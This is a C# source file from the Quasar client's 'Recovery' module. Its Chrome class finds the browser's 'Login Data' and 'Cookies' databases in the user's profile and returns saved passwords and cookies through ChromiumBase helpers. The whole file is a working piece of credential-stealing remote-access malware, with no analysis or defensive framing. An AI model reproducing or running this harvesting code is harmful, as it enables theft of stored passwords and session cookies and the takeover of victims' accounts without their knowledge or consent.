using System;
using System.Collections.Generic;
using System.IO;
using Quasar.Client.Recovery.Utilities;
using Quasar.Common.Models;

namespace Quasar.Client.Recovery.Browsers
{
    public class Chrome
    {
        public static List<RecoveredAccount> GetSavedPasswords()
        {
            try
            {
                string datapath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "Google\\Chrome\\User Data\\Default\\Login Data");
                return ChromiumBase.Passwords(datapath, "Chrome");
            }
            catch (Exception)
            {
                return new List<RecoveredAccount>();
            }
        }

        public static List<ChromiumBase.ChromiumCookie> GetSavedCookies()
        {
            try
            {
                string datapath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "Google\\Chrome\\User Data\\Default\\Cookies");
                return ChromiumBase.Cookies(datapath, "Chrome");
            }
            catch (Exception)
            {
                return new List<ChromiumBase.ChromiumCookie>();
            }
        }

    }
}
